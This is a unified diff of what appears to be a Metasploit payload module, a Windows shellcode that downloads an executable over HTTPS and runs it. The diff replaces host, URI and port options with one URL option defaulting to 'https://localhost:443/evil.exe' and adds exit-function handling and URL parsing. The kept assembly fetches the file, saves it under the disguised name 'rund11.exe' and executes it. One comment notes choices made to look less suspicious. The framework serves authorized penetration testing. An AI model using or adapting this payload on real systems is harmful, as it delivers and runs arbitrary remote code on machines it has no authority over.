@@ -20,8 +20,8 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Windows Executable Download & Execute (https), supports proxy',
-			'Description'   => 'Download an EXE from a URL using HTTPS (with proxy support) and execute it',
+			'Name'          => 'Windows Executable Download (https) and Execute',
+			'Description'   => 'Download an EXE from an HTTPS URL and execute it',
 			'Author'        =>
 				[
 					'corelanc0d3r <peter.ve[at]corelan.be>'
@@ -32,15 +32,10 @@ module Metasploit3
 			'Arch'          => ARCH_X86
 		))
 
-		# EXITFUNC is not supported 
-		deregister_options('EXITFUNC')
-
 		# Register command execution options
 		register_options(
 			[
-				OptString.new('RHOST', [ true, "The webserver hosting the executable to download" ]),
-				OptString.new('URI', [true, "The full URI to the binary" ,"/"]),
-				OptInt.new('PORT', [ true, "The HTTPS port to connect to", 443]),
+				OptString.new('URL', [true, "The pre-encoded URL to the executable" ,"https://localhost:443/evil.exe"]),
 				OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
 			], self.class)
 	end
@@ -50,10 +45,61 @@ module Metasploit3
 	#
 	def generate
 
-		port_nr		= datastore['PORT'] || 443
-		server_host	= datastore['RHOST']
-		server_uri	= datastore['URI']
-		filename	= datastore['EXE']
+		target_uri = datastore['URL'] || ""
+		filename = datastore['EXE'] || ""
+	
+		exitfuncs = {
+					"PROCESS"	=> 0x56A2B5F0,	#kernel32.dll!ExitProcess
+					"THREAD"	=> 0x0A2A1DE0,	#kernel32.dll!ExitThread
+					"SEH"		=> 0x00000000,	#we don't care
+					"NONE"		=> 0x00000000	#we don't care
+				}
+
+		exitfunc = datastore['EXITFUNC'].upcase
+
+		if exitfuncs[exitfunc]
+			exitasm = case exitfunc
+        			when "SEH" then "xor eax,eax\ncall eax"
+				when "NONE" then "jmp end"	# don't want to load user32.dll for GetLastError
+				else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]   
+			end
+        	end	
+
+		# parse URL and break it down in
+		# - remote host
+		# - port
+		# - /path/to/file
+
+		server_uri = ''
+		server_host = ''
+		port_nr	= 443	# default
+
+		if target_uri.length > 0
+
+			# first, sanitize the input
+			target_uri = target_uri.gsub('http://','')	#don't care about protocol
+			target_uri = target_uri.gsub('https://','')	#don't care about protocol
+		
+			server_info = target_uri.split("/")
+
+			# did user specify a port ?
+			server_parts = server_info[0].split(":")
+			if server_parts.length > 1
+				port_nr = Integer(server_parts[1])
+			end
+
+			# actual target host
+			server_host = server_parts[0]
+
+			# get /path/to/remote/exe
+			
+
+			for i in (1..server_info.length-1)
+				server_uri << "/"
+				server_uri << server_info[i]
+			end
+
+		end
 
 		#create actual payload
 		payload_data = <<EOS
@@ -234,7 +280,7 @@ httpsendrequest:
 
 try_it_again:
 	dec ebx
-	jz failure
+	jz thats_all_folks	; failure -> exit
 	jmp set_security_options
 
 dbl_get_server_host:
@@ -245,10 +291,6 @@ get_server_uri:
 
 server_uri:
 	db "/#{server_uri}", 0x00
-
-failure:
-	push 0x56A2B5F0        ; hardcoded to exitprocess for size
-	call ebp
 
 allocate_memory:
 	push 0x04              ; PAGE_READWRITE, doesn't need to be executable, less suspicious perhaps ?
@@ -273,7 +315,7 @@ download_more:
 	call ebp
 
 	test eax,eax           ; download failed? (optional?)
-	jz failure
+	jz thats_all_folks	; failure -> exit
 
 	mov eax, [edi]
 	add ebx, eax           ; buffer += bytes_received
@@ -321,9 +363,7 @@ execute_file:
 	call ebp
 
 thats_all_folks:
-	push 0
-	push 0x56A2B5F0		;kernel32.dll!ExitProcess
-	call ebp
+	#{exitasm}
 
 get_filename:
 	call get_filename_return
@@ -334,6 +374,7 @@ get_server_host:
 
 server_host:
 	db "#{server_host}", 0x00
+end:
 EOS
 		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
 	end
